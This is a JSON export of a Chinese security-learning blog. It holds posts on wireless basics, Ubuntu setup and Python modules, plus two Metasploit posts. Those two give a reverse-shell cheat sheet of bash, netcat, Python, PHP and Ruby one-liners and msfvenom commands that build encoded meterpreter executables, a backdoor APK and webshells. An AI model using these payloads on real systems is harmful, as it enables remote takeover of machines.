{"meta":{"title":"黑客技术学习记录自留地","subtitle":"努力成为自己认可的黑客...","description":null,"author":"Ein","url":"https://sakuxa.com","root":"/"},"pages":[{"title":"about","date":"2019-02-21T06:14:25.000Z","updated":"2019-02-22T02:51:35.225Z","comments":true,"path":"about/index.html","permalink":"https://sakuxa.com/about/index.html","excerpt":"","text":"关于我The quiter you become,the more you are able to hear. Email：wusup3rb@163.com Wechat：WuSup3rb"},{"title":"tags","date":"2019-02-21T06:17:20.000Z","updated":"2019-02-21T06:17:20.184Z","comments":true,"path":"tags/index.html","permalink":"https://sakuxa.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Metasploit学习系列之一句话反弹shell","slug":"msf系列之msfvenom02","date":"2019-05-28T13:51:15.000Z","updated":"2019-05-28T15:32:52.415Z","comments":true,"path":"2019/05/28/msf系列之msfvenom02/","link":"","permalink":"https://sakuxa.com/2019/05/28/msf系列之msfvenom02/","excerpt":"该篇记录如何使用Msfvenom生成各种一句话反弹Shell，同时也是Reverse Shell Cheat Sheet.","text":"该篇记录如何使用Msfvenom生成各种一句话反弹Shell，同时也是Reverse Shell Cheat Sheet. 0x01 Msfvenom查看所有反弹shell payload： msfvenom --list payload | grep cmd Bash 生成一句话Reverse shell： msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.102 lport=4444 Reverse shell： 0&lt;&amp;214-;exec 214&lt;&gt;/dev/tcp/192.168.1.102/4444;sh &lt;&amp;214 &gt;&amp;214 2&gt;&amp;214 Netcat shell 生成一句话Reverse shell： msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=4444 Reverse shell：mkfifo /tmp/npkto; nc 192.168.1.102 4444 0&lt;/tmp/npkto | /bin/sh &gt;/tmp/npkto 2&gt;&amp;1; rm /tmp/npkto Perl msfvenom -p cmd/unix/reverse_perl lhost=192.168.1.102 lport=4444 Python msfvenom -p cmd/unix/reverse_python lhost=192.168.1.102 lport=4444 Powershell msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.102 lport=4444 Ruby msfvenom -p cmd/windows/reverse_ruby lhost=192.168.1.102 lport=4444 PHP msfvenom -p cmd/unix/reverse_php_ssl lhost=192.168.1.102 lport=4444 参考链接 https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/ 0x02 Reverse Shell Cheat SheetBash bash -i &gt;&amp; /dev/tcp/192.168.0.5/4444 0&gt;&amp;1 Netcat nc -e /bin/sh 192.168.0.5 4444 Python python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.5&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39; PHP php -r &#39;$sock=fsockopen(&quot;192.168.0.5&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; Ruby ruby -rsocket -e&#39;f=TCPSocket.open(&quot;192.168.0.5&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39; 参考链接： https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md 0x03 附,Kali WebShell /usr/share/webshells/","categories":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://sakuxa.com/categories/Metasploit/"}],"tags":[{"name":"Msfvenom","slug":"Msfvenom","permalink":"https://sakuxa.com/tags/Msfvenom/"},{"name":"Reverse Shell Cheat Sheet","slug":"Reverse-Shell-Cheat-Sheet","permalink":"https://sakuxa.com/tags/Reverse-Shell-Cheat-Sheet/"}],"author":"sh4douu"},{"title":"Metasploit学习系列之msfvenom生成payload","slug":"msf系列之msfvenom","date":"2019-05-26T04:07:44.000Z","updated":"2019-05-28T15:28:46.188Z","comments":true,"path":"2019/05/26/msf系列之msfvenom/","link":"","permalink":"https://sakuxa.com/2019/05/26/msf系列之msfvenom/","excerpt":"MSFvenom 是一个组合了 Msfpayload、Msfencode工具为一体的一个框架，主要用来生成Payload.","text":"MSFvenom 是一个组合了 Msfpayload、Msfencode工具为一体的一个框架，主要用来生成Payload. Windows0x00 反弹meterpreter（x86） msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444 -b &#39;\\x00\\x0a\\xff&#39; -f exe -e x86/shikata_ga_nai -i 4 -o payload32.exe 在不指定架构（-a &lt;arch&gt;）和平台（--platform）时，Msfvenom会根据Payload自动选择（可以在指定payload后用--list-options查看）。 该模块默认选择平台为Windows，选择架构为x86。 本地监听端口，等待反弹 12345msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.1.102msf5 exploit(multi/handler) &gt; set lport 4444msf5 exploit(multi/handler) &gt; exploit 0x01 反弹meterpreter（x64） msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444 -b &#39;\\x00\\x0a\\xff&#39; -f exe -e x86/shikata_ga_nai -i 4 -o payload64.exe 0x02 反弹meterpreter（x86）over HTTP 可能会遇到这么一种情况，即目标主机或目标主机网络环境过滤了多余的端口，只允许一些关键端口（如，HTTP、HTTPS）的流量通过。那么我们就可以将我们的流量封装在HTTP或HTTPS协议中以逃避过滤规则。 msfvenom -p windows/meterpreter/reverse_http lhost=192.168.1.102 lport=80 -b &#39;\\x00\\x0a\\xff&#39; -f exe -e x86/shikata_ga_nai -i 4 -o payloadhttp.exe 设置监听： 12345msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_httpmsf5 exploit(multi/handler) &gt; set lhost 192.168.1.102msf5 exploit(multi/handler) &gt; set lport 80msf5 exploit(multi/handler) &gt; exploit 对比reverse_tcp与reverse_http的数据封装情况： 使用windows/x64/meterpreter/reverse_tcp为Payload时抓取数据包： 使用windows/meterpreter/reverse_http为Payload时抓取数据包，可以发现数据以URL部分被进行传输： PS：若是HTTPS，把Payload改为HTTPS即可。 Linux msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444 -f elf -o shell.elf 监听： 12345msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set linux/x86/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.1.102msf5 exploit(multi/handler) &gt; set lport 4444msf5 exploit(multi/handler) &gt; exploit Android msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444 -o backdoor.apk 监听： 12345msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set android/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.1.102msf5 exploit(multi/handler) &gt; set lport 4444msf5 exploit(multi/handler) &gt; exploit Python msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444 -f raw -o payload1.py 设置监听： 12345msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload python/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.1.102msf5 exploit(multi/handler) &gt; set lport 4444msf5 exploit(multi/handler) &gt; exploit 受害主机执行： msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444 -f python -o payload.py -f python或-f py时，内容为十六进制： 其他Mac msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp lhost=攻击机IP lport=攻击机port -f macho -o payload.macho Powershell msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp lhost=攻击机IP lport=攻击机PORT -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1 PHP msfvenom -p php/meterpreter_reverse_tcp lhost=攻击机IP lport=攻击机port -f raw -o shell.php aspx msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=攻击机IP lport=攻击机port -f aspx -o payload.aspx JSP msfvenom --platform java -p java/jsp_shell_reverse_tcp lhost=攻击机IP lport=攻击机port -f raw -o payload.jsp WAR msfvenom -p java/jsp_shell_reverse_tcp lhost=攻击机IP lport=攻击机port -f raw -o payload.war 参考链接https://www.hackingarticles.in/msfvenom-tutorials-beginners/","categories":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://sakuxa.com/categories/Metasploit/"}],"tags":[{"name":"Meterpreter","slug":"Meterpreter","permalink":"https://sakuxa.com/tags/Meterpreter/"},{"name":"Msfvenom","slug":"Msfvenom","permalink":"https://sakuxa.com/tags/Msfvenom/"}],"author":"sh4douu"},{"title":"无线渗透：Chapter 1-基础知识","slug":"01无线渗透-基础知识","date":"2019-05-19T02:14:03.000Z","updated":"2019-05-21T01:11:14.277Z","comments":true,"path":"2019/05/19/01无线渗透-基础知识/","link":"","permalink":"https://sakuxa.com/2019/05/19/01无线渗透-基础知识/","excerpt":"该篇为无线渗透系列的第一篇文章，主要介绍802.11协议族、2.4Ghz频谱、无线网络架构、无线网卡的基本配置以及困扰本人许久了无线认证与加密。 内容并不是很全面很深入，仅作为开启无线渗透的铺垫。","text":"该篇为无线渗透系列的第一篇文章，主要介绍802.11协议族、2.4Ghz频谱、无线网络架构、无线网卡的基本配置以及困扰本人许久了无线认证与加密。 内容并不是很全面很深入，仅作为开启无线渗透的铺垫。 0x00 802.11协议簇802.11a/b/g/n/ac 协议 频率 信号 最大传输速率 802.11 2.4Ghz FHSS 或 DSSS 2Mps 802.11a 5GHz OFDM 54Mps 802.11b 2.4GHz HR-DSSS 11Mps 802.11g 2.4GHz OFDM 54Mps 802.11n 2.4GHz或5GHz OFDM 540Mps 802.11ac 5GHz OFDM 900Mps 802.11ac 802.11ac的核心技术主要基于802.11a，继续工作在5.0GHz频段上以保证向下兼容性，但数据传输通道会大大扩充，在当前 20MHz的基础上增至40MHz或者80MHz，甚至有可能达到160MHz。再加上大约10%的实际频率调制效率提升，新标准的理论传输速度最高有望 达到1Gbps，是802.11n 300Mbps的三倍多。802.11ac是第一个承诺将无线数据传输率提升到超过1Gbps的标准，而且还包含很多先进特性来改善用户体验。 小结 目前最快的传输协议是802.11ac。如果想要体验高速上网，那么选择电子产品的时候一定要留意，查看电子产品是否支持802.11ac协议。尤其是手机，电脑，路由器。如今千兆网络已经开始普及，如果不支持802.11ac协议的电子设备，是无法享受千兆网络的。 0x01 无线频谱 1.每个子信道宽度为22MHz。2.相邻信道的中心频点间隔5MHz 。3.相邻的多个信道存在频率重叠(如1信道与2、3、4、5信道有频率重叠)。4.整个频段内只有3个（1、6、11）互不干扰信道。 0x02 无线网络架构及术语 BSS（Basic Service Set）：即基本服务集，是由AP与Station组成的部分。BSSID通常是AP的MAC地址。 ESS（Extended Service Set）：即扩展服务集，多个BSS组成一个ESS。ESSID通常与SSID相同，即WiFi名称。 DS（Distributed System）：即分布式系统，分布式系统属于802.11逻辑组件，负责将帧转发至目的地址，简单来说即有线网络部分。 0x03 无线网卡基本信息iwconfig 查看或配置无线网卡。 iw list 显示无线网卡的详细信息，例如网卡支持的加密套件、模式（monitor\\ap...）、频率、带宽、802.11协议类型等。 iwlist 上一条命令是显示一堆东西，该命令可认为是只显示上面命令的特点信息。 123456789101112131415161718iwlist [interface] scanning [essid NNN] [last] [interface] frequency #网卡支持的频率。 [interface] channel #网卡支持的信道。 [interface] bitrate #网卡支持的比特率。 [interface] rate #网卡支持的速率。 [interface] encryption [interface] keys [interface] power [interface] txpower [interface] retry [interface] ap [interface] accesspoints [interface] peers [interface] event [interface] auth [interface] wpakeys [interface] genie [interface] modulation iw iw dev wlan0 scan #使用wlan0网卡扫描附近的无线网络,可以获得无线网络的详细信息(所在信道/beacon帧的周期/信号/SSID/加密方式等). iw dev wlan2 scan | grep SSID iw dev wlan2 scan | egrep “DS\\ Parameter\\ set|SSID” iwlist wlan2 scanning | egrep “ESSID|Channel” 0x04 无线网卡模式：monitor如果你有尝试过抓无线包，你会发现,即使我们使用抓包工具(如Wireshark)对无线网卡抓包,抓到的数据包是不包含802.11帧头的,这是因为系统内核默认会将数据包的802.11帧头去掉。 如果我们想要抓取包含802.11帧头数据包,我们需要将无线网卡设置为monitor模式(默认是managed模式)。 而且设置为monitor模式后,无线网卡可以监听到广播域中的所有数据包,类似有线网卡的混杂模式。 无线网卡设置monitor iw dev wlan0 interface add wlan0mon type monitor #将wlan0网卡设置为monitor模式。 wlan0将会生成一个别名网卡wlan0mon。在kali中,网卡别名的格式是严格规定为:wlanXmon(X为数字)。 别名网卡需要使用命令启用:sudo ifconfig wlan0mon up 删除monitor模式的别名网卡:iw dev wlan0mon interface del 对别名网卡进行抓包,成功抓到802.11数据包: 0x04 无线认证与加密 1.无线网络的安全性由认证和加密来保证。 认证：对接入的用户（Station）进行身份认证，只有被许可了才能接入网络。 加密：提供数据的保密性和完整性（数据在传输过程中不会被篡改）。 2.802.11标准最初只定义了两种认证方式及一种加密方式：两种认证方式： 开放系统认证（Open System Authentication）：即不进行身份认证，任何人都可接入。 共享密钥认证（Shared Key Authentication）： 一种加密算法： WEP:有线等效保密（Wired Equivalent Privacy）。 安全策略： 对于开放系统认证，在设置时也可以启用WEP(WEP-open)，此时，WEP用于在传输数据时加密，对认证没有任何作用。若不启用WEP则不进行验证也不进行加密。 对于共享密钥认证，必须启用WEP，WEP不仅用于认证加密，也用于在传输数据时加密。 3.WPA 由于WEP有一些严重安全缺陷,Wi-Fi联盟与IEEE一起开发了Wi-Fi受保护的访问（Wi-Fi Protected Access – WPA）以解决WEP的缺陷。 WPA WPA不同于WEP，WPA同时提供认证（基于802.1x可扩展认证协议 – Extensible Authentiation Protocl - EAP的认证）和加密（临时密钥完整性协议 – Temporal Key Integrity Protocol – TKIP）。 TKIP是加密套件(协议),使用对称加密算法RC4，TKIP使用128位临时密钥和48位初始化向量（IV）。 WPA2 由于WPA1使用RC4算法,存在安全隐患.因此开发出WPA2,WPA2使用CCMP加密套件(协议)。 CCMP使用对称加密算法AES。 PS:WPA1和WPA2验证需要基于802.1x协议,需要有验证服务器. WPA/WPA2-Personal或WPA/WPA2 Pre-Shared Key或WPA/WPA2-PSK… 由于需要独立的认证服务器对于个人/家庭显然成本过高,不太实际,因此产生使用共享密钥验证方式的WPA/WPA2加密策略。 注意，WPA的共享密钥认证是WPA策略是内置的，与802.11最初定义的共享密钥认证是无关的。","categories":[{"name":"无线渗透","slug":"无线渗透","permalink":"https://sakuxa.com/categories/无线渗透/"}],"tags":[{"name":"WLAN","slug":"WLAN","permalink":"https://sakuxa.com/tags/WLAN/"},{"name":"802.11","slug":"802-11","permalink":"https://sakuxa.com/tags/802-11/"},{"name":"无线渗透","slug":"无线渗透","permalink":"https://sakuxa.com/tags/无线渗透/"}],"author":"sh4douu"},{"title":"打造我的Ubuntu 18.04","slug":"my-ubuntu-config-2mac","date":"2019-05-14T13:33:57.000Z","updated":"2019-05-21T02:15:47.990Z","comments":true,"path":"2019/05/14/my-ubuntu-config-2mac/","link":"","permalink":"https://sakuxa.com/2019/05/14/my-ubuntu-config-2mac/","excerpt":"最近终于受不了Windows动不动就程序未响应，加上在日常工作中，使用的大部分工具都是在Linux下的，总是打开Kali虚拟机也烦了，索性就将笔记本的主系统更换为Ubuntu 18.04。 更重要的是，Gnome可DIY的桌面对于拥有极客之心的人是无法拒绝的，本文记录了自己Ubuntu打造的过程，使用类似苹果的UI：Ubuntu 2 Mac。","text":"最近终于受不了Windows动不动就程序未响应，加上在日常工作中，使用的大部分工具都是在Linux下的，总是打开Kali虚拟机也烦了，索性就将笔记本的主系统更换为Ubuntu 18.04。 更重要的是，Gnome可DIY的桌面对于拥有极客之心的人是无法拒绝的，本文记录了自己Ubuntu打造的过程，使用类似苹果的UI：Ubuntu 2 Mac。 最终效果图： 0x00 Mac主题安装Tweak sudo apt-get install gnome-tweak-tool 安装gnome-shell sudo apt-get install chrome-gnome-shell 用浏览器打开https://extensions.gnome.org，点击页面的`Click here to install browser extension`按钮。 点击页面extensions，启用User Themes扩展。 下载并启动blyr扩展。 下载并启动netspeed扩展：显示网络速度。 下载并启动coverflow alt-tab：切换窗口的主题。 下载并启动hide dash x：隐藏搜索时左边的Dock。 到https://www.gnome-look.org 下载MacOS 主题、图标、鼠标指针、GDM、Plymouth、字体 MacOS UI主题 Gnome-shell：按照gnome-shell.css文件渲染。 icons：应用图标。 GDM：锁屏时的主题。 Plymouth：开机启动动画。 将下载的主题文件（系统主题、gnome-shell主题）解压后放到用户家目录下的.themes目录下：/home/.themes。 将下载的图标文件和鼠标指针文件解压后放到用户家目录下的.icons目录下：/home/.icons。 把字体文件拷贝到~/.local/share/fonts目录下。 注：.themes和.icons需要自己创建。Ctrl+H可以显示目录下的隐藏文件。 之后，打开tweak选择主题、游标、图标、字体。。。。 设置窗口的按钮（最小化、最大化、关闭）在左边： Ubuntu：打开Tweak——Windows——Tilebar buttons——Placement——left Kali：打开Tweak——Windows Title——Tilebar buttons——Placement——left 壁纸网站（需科学上网）：https://wallpapersite.com/ 0x01 Dock卸载Ubuntu自带的Dock、 sudo apt remove gnome-shell-extension-ubuntu-dock 安装plank dock： sudo apt-get install plank 设置开机启动： Win键打开搜索 –&gt; 搜索startup –&gt; 打开startup application –&gt; add –&gt; command处输入plank即可。 plank主题： 主题下载地址：https://www.gnome-look.org/p/1201720/ 将下载的文件放到：~/.local/share/plank/theme/目录下。 在plank的preference选用主题即可。 0x02 Zsh查看系统已安装的shell有哪些：cat /etc/shells 查看系统当前shells：echo $SHELL 安装zsh： apt-get install zsh 安装zsh配置框架oh-my-zsh：wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O - | sh 在以 root 用户为前提下，oh-my-zsh 的安装目录：/root/.oh-my-zsh 在以 root 用户为前提下，Zsh 的配置文件位置：/root/.zshrc 为 root 用户设置 zsh 为系统默认 shell：chsh -s /bin/zsh root 如果你要重新恢复到 bash：chsh -s /bin/bash root zsh配置 主题配置：主题文件所在目录为~/.oh-my-zsh/themes。 ls ~/.oh-my-zsh/themes | wc -l 主题介绍：https://github.com/robbyrussell/oh-my-zsh/wiki/Themes 修改主题：vim ~/.zshrc 找到：ZSH_THEME=”robbyrossell”改为自己喜欢的，默认是robbyrossell，想随机就使用random。 假设使用agnoster主题： ZSH_THEME=”agnoster” 会出现箭头乱码，是因为没有安装powerline字体：https://github.com/powerline/fonts #克隆git clone https://github.com/powerline/fonts.git –depth=1 #安装cd fonts./install.sh #安装完成后可删除文件cd ..rm -rf fonts 插件设置：插件文件所在目录为~/.oh-my-zsh/plugins ls ~/.oh-my-zsh/plugins | wc -l 插件介绍：https://github.com/robbyrussell/oh-my-zsh/wiki/Plugins 启用插件：vim ~/.zshrc 找到plugins=(git)，括号（）中即要要启用的插件，默认启用了git，多个用空格分开。 修改启用插件后让配置文件生效：source ~/.zshrc 对于zsh没有自带的插件，可以将其下载放到：~/.oh-my-zsh/custom/plugins目录下，然后再在配置文件中启用。 例如： #安装外部插件：zsh-syntax-highlighting，作用是zsh语法高亮。cd ~/.oh-my-zsh/custom/pluginsgit clone https://github.com/zsh-users/zsh-syntax-highlighting.git #安装zsh-autosuggestionscd ~/.oh-my-zsh/custom/pluginsgit clone https://github.com/zsh-users/zsh-autosuggestions.git 0x03 conky安装conky： sudo apt-get install conky-all 运行conky时，conky默认会使用~/.conkyrc作为配置文件。 conky主题： https://www.deviantart.com/customization/skins/linuxutil/applications/conky/newest/?offset=0 https://www.deviantart.com/custom-linux/gallery/39357745/Conky-Themes 肥宅：https://www.deviantart.com/justhumans404/art/Natsuki-conky-ddlc-721176434&gt; 简约：https://github.com/mr-mierzejewski/conkyrc 0x04 基本工具软件安装1.安装shadowsocks-qt5 说明：shadowsocks-qt5是ubuntu上一个可视化的版本 Ubuntu 18.04出现无法安装ss-qt5：https://blog.csdn.net/a912952381/article/details/81172971 123sudo add-apt-repository ppa:hzwhuang/ss-qt5sudo apt-get updatesudo apt-get install shadowsocks-qt5 2.安装搜狗输入法： https://jingyan.baidu.com/article/e75057f20d9521ebc91a890a.html https://www.jianshu.com/p/01ffac435ea8 3.安装Chrome： https://www.google.cn/intl/zh-CN/chrome/ 4.安装JAVA 安装Oracle Java：https://tecadmin.net/install-oracle-java-11-ubuntu-18-04-bionic/ 安装OpenJDK：sudo apt-get install openjdk-8-jdk 注： ​ Oracle Java是Oracle官方的Java版本，但apt方式只能安装Java 11。OpenJDK Java是开源的Java版本。 ​ 当系统安装了多个Java版本时，可以使用命令切换默认使用的Java：sudo update-alternatives –config java ​ 使用java -version查看当前系统默认使用的Java版本信息。 5.Misc： 123456789101112131415161718192021sudo apt install proxychains #代理工具meld #文件比较工具amule #电驴下载工具transmission #种子下载工具ttf-wqy-microhei #字体mtr #Traceroute工具（GUI）whois #域名信息查询工具git #版本管理工具curl #命令行HTTP请求工具obs-studio #录屏、直播软件unrar unrar-free #rar压缩包解压woeusb #刻录工具ascii #显示ascii表unicode #字符对应的Unicode编码axel #命令行下载工具（类似wget）screefetch #打印banner ubuntu-restricted-extras #视频解码器包libavcodec-extra #视频解码相关libdvd-pkg #dvd格式视频解码器 6.安装Tmux https://www.cnblogs.com/wangqiguo/p/8905081.html https://www.cnblogs.com/kevingrace/p/6496899.html https://www.cnblogs.com/maoxiaolv/p/5526602.html 7.Motrix：开源、跨平台，支持下载 HTTP、FTP、BT、磁力链、百度网盘。 https://github.com/agalwood/Motrix/releases/tag/v1.3.8 https://motrix.app/ 0x05 常用快捷键123456789101112131415161718192021Win + a #显示所有已安装的程序PrtSc #全屏截屏Shift + PrtSc #截屏选定范围Ctrl + Alt + t #打开一个终端Ctrl + Shift + t #在已打开终端情况下，会打开一个新的tab终端Ctrl + Shift + n #在已打开终端情况下，会打开一个新的独立窗口的终端Ctrl + Shift + q #关闭该终端，所有Tab终端都将被关闭Ctrl + Shift + w #只关闭当前tab终端。Ctrl + d #显示桌面Ctrl + t #打开新页签Ctrl + q/w #关闭程序/页签Win + 上下左右方向键 #调整程序窗口位置Win + h #最小化当前程序窗口Win + l #锁屏","categories":[{"name":"Misc","slug":"Misc","permalink":"https://sakuxa.com/categories/Misc/"}],"tags":[{"name":"My Ubuntu","slug":"My-Ubuntu","permalink":"https://sakuxa.com/tags/My-Ubuntu/"},{"name":"Ubuntu 2 Mac","slug":"Ubuntu-2-Mac","permalink":"https://sakuxa.com/tags/Ubuntu-2-Mac/"}]},{"title":"Python模块 Chapter 3：subprocess","slug":"03python模块之subprocess","date":"2019-04-11T12:25:26.000Z","updated":"2019-05-21T03:01:58.011Z","comments":true,"path":"2019/04/11/03python模块之subprocess/","link":"","permalink":"https://sakuxa.com/2019/04/11/03python模块之subprocess/","excerpt":"subprocess模块允许你创建一个新的进程，新建进程是当前程序的子进程。可以连接到新建进程的input/output/error pipes, 并且可以获取到它们的返回码。","text":"subprocess模块允许你创建一个新的进程，新建进程是当前程序的子进程。可以连接到新建进程的input/output/error pipes, 并且可以获取到它们的返回码。 0x00 概述这个模块是为了取代下面这些比较老的模块功能： 12os.systemos.spawn* subprocess模块提供两种方法来创建新的进程： subprocess.run() subprocess.Popen() 使用run()方法创建新进程可以满足绝大多数需求，但Popen（）类提供比run()更高级更灵活的用法。 0x01 subprocess.Popen()产生一个子进程执行程序： 对于 POSIX 系统, 该类调用os.execvp()函数来创建子进程。 对于 Windows 系统,该类调用Windows API函数 CreateProcess() 来创建子进程。 Popen类的构造方法： 1234567def __init__(self, args, bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=_PLATFORM_DEFAULT_CLOSE_FDS, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0, restore_signals=True, start_new_session=False, pass_fds=(), *, encoding=None, errors=None): args：该参数要求是一个序列类型（list、tuple…）或字符串（str）。 如果args是一个序列，那么序列的第一个元素被作为程序名（路径），之后的作为参数。 在Windows上时，如果args是一个序列，会被转换为字符串。 shell：为True时，使用系统shell执行args指定的程序，默认是False。 On POSIX with shell=True, the shell defaults to /bin/sh. 对于Windows，你只有在需要执行内置DOS命令时（例如，dir、ipconfig…），才使用shell=True。运行批处理文件（.bat）或可执行文件时没有必要将shell参数设为True。 stdin、stdout、stderr： 指定执行程序的标准输入、标准输出、标准错误输出的文件句柄。 若不指定则默认都为None，表示不进行重定向，那么子进程会从父进程继承文件句柄。 若指定了，即进行重定向。有效值可以为subprocess.PIPE、subprocess.DEVNULL、现有文件描述符（正整数）、现有文件对象（open()函数返回的对象）和None。 另外，stderr可以是 subprocess.STDOUT，表示应用程序的标准错误输出的文件句柄与标准输出的文件句柄相同。（相当于2&gt;&amp;1） cwd：如果cwd不是None，则在执行子进程程序之前先将工作目录更改为 cwd。 如果指定了encoding或erroes，或者text为True，则stdin，stdout和stderr的流为文本（str）流，universal_newlines参数等同于text，并提供向后兼容性。默认情况下，数据流为二进制流。 Popen类的实例有如下方法： Popen.poll（）：检查子进程是否已终止。 Popen.wait(timeout=None)：挂起等待子进程结束，若设置了timeout参数，超时但进程还未结束则抛出TimeoutExpired异常。 Popen.communicate(input=None, timeout=None)：与子进程进行交互，发送数据到标准输入、从标准输出或标准错误输出读取数据直到遇到EOF（end-of-file）。 communicate()函数返回值为元组 (stdout_data, stderr_data)。 要使用该方法向子进程标准输入写入数据或读取标准输出和标准错误输出的数据，在实例化Popen类时，要指定stdin=PIPE、stdout=PIPE、stderr=PIPE。 Popen.send_signal(signal)：发送信号到子进程。 Popen.terminate()：终止子进程。 On Posix OSs the method sends SIGTERM to the child. On Windows the Win32 API function TerminateProcess() is called to stop the child. Popen.kill() Kills the child. On Posix OSs the function sends SIGKILL to the child. On Windows kill()is an alias for terminate(). Popen类的实例的属性： Popen.args：获取args参数的值，是一个list或str。 Popen.stdin： 如果实例化时，stdin参数是PIPE, 该属性会返回open()函数返回的可写的文件对象，该文件对象链接着子程序的标准输入。 如果指定了encoding或errors参数或者universal_newlines参数为True, 文件流为文本（str）流, 否则为字节（byte）流。 如果实例化时，stdin参数不是PIPE, 该属性返回 None。 Popen.stdout： 如果实例化时，stdout参数是PIPE, 该属性会返回open()函数返回的可读的文件对象，该文件对象链接着子程序的标准输出，读取该文件对象可以获得子程序的标准输出。 如果指定了encoding或errors参数或者universal_newlines参数为True, 文件流为文本（str）流, 否则为字节（byte）流。如果实例化时，stdout参数不是PIPE, 该属性返回 None。 Popen.stderr：同上，但是读取的是子进程的标准错误输出。 Popen.pid：获取子进程的PID。如果shell=True，返回则是系统shell进程的PID。 Popen.returncode：返回码。 使用communicate()而不是.stdin.write, .stdout.read or .stderr.read以避免由于管道缓冲区填满阻塞子进程而导致的死锁。 上下文管理： Popen对象支持with语句进行上下文管理。 12with Popen([\"ifconfig\"], stdout=PIPE) as proc: log.write(proc.stdout.read()) 0x02 subprocess.run() 运行args描述的命令。等待命令执行完成，然后返回一个CompletedProcess类的实例。 参数的使用与Popen类基本相同。 12subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None) 如果capture_output 为True, stdout 和 stderr 将会被捕获，默认为False。 如果shell为True，表示使用系统的shell来执行arg描述的命令；如果为shell为False，则打开arg描述的对象。 如果指定了encoding或erroes，或者text为True，则stdin，stdout和stderr的流为文本（str）流，universal_newlines参数等同于text，并提供向后兼容性。默认情况下，数据流为二进制流。 0x04 subprocess.CompletedProcess() subprocess.run()方法执行结束后返回该类的实例。 该类有如下方法（属性）： args：获取传入run()方法的第一个参数，是一个list或str。 returncode：获取返回码，为0表示函数执行成功。 stdout：从标准输出中获取run()方法的输出结果（capture_output=True时才能获取到结果），结果为bytes类型字符串（若encoding参数不为None，则结果为str类型）。 stderr：同上，但获取的是标准错误输出结果。 check_returncode（）：当run()的返回值不为0时，调用该方法会抛出一个CalledProcessError异常。 run()方法执行成功的情况： run()方法执行失败的情况： 参考链接： https://docs.python.org/3/library/subprocess.html","categories":[{"name":"Python","slug":"Python","permalink":"https://sakuxa.com/categories/Python/"}],"tags":[{"name":"Python模块","slug":"Python模块","permalink":"https://sakuxa.com/tags/Python模块/"},{"name":"subprocess","slug":"subprocess","permalink":"https://sakuxa.com/tags/subprocess/"}]},{"title":"Python模块 Chapter 2：re","slug":"02python模块之re","date":"2019-04-09T07:32:30.000Z","updated":"2019-05-21T02:16:17.976Z","comments":true,"path":"2019/04/09/02python模块之re/","link":"","permalink":"https://sakuxa.com/2019/04/09/02python模块之re/","excerpt":"re是python下内置的正则匹配模块。","text":"re是python下内置的正则匹配模块。 0x00 规则123456789101112131415161718192021222324252627. 元字符.表示匹配任何字符，除\\n之外。* 表示匹配前面的字符或分组0次或多次。+ 表示匹配前面的字符或分组1次或多次。？ 表示匹配前面的字符或分组0次或1次。 &#123;x&#125; 表示匹配前面的字符或分组x次。&#123;x,y&#125; 表示匹配前面的字符或分组x次至y次之间。^ 表示匹配开始为^之后的。\\A同样作用。$ 表示匹配结束为$之前的。\\Z同样作用[abcd] 表示匹配其中的任意之一。[1-9] 表示匹配1-9范围内的任意之一，也可以用[A-Z]、[a-z]、[0-9a-zA-Z]。[^abc] 脱字符出现在[]中意义为‘非’，即不匹配其中的任何一个。也可用于范围[^1-9]、[^a-z] \\d 表示匹配任何一个十进制数字。与[0-9]等同。 \\D 表示匹配任何一个非十进制数字。与[^0-9]等同。 \\w 表示匹配任何一个十进制数字和字母。与[0-9a-zA-Z]等同。 \\W 表示匹配任何一个除十进制数字和字母。与\\w相反 \\s 表示匹配任何一个空格字符。与[\\n\\t\\r\\v\\f]等同。 \\S 表示与\\s相反。与[^\\n\\t\\r\\v\\f]等同。 \\b 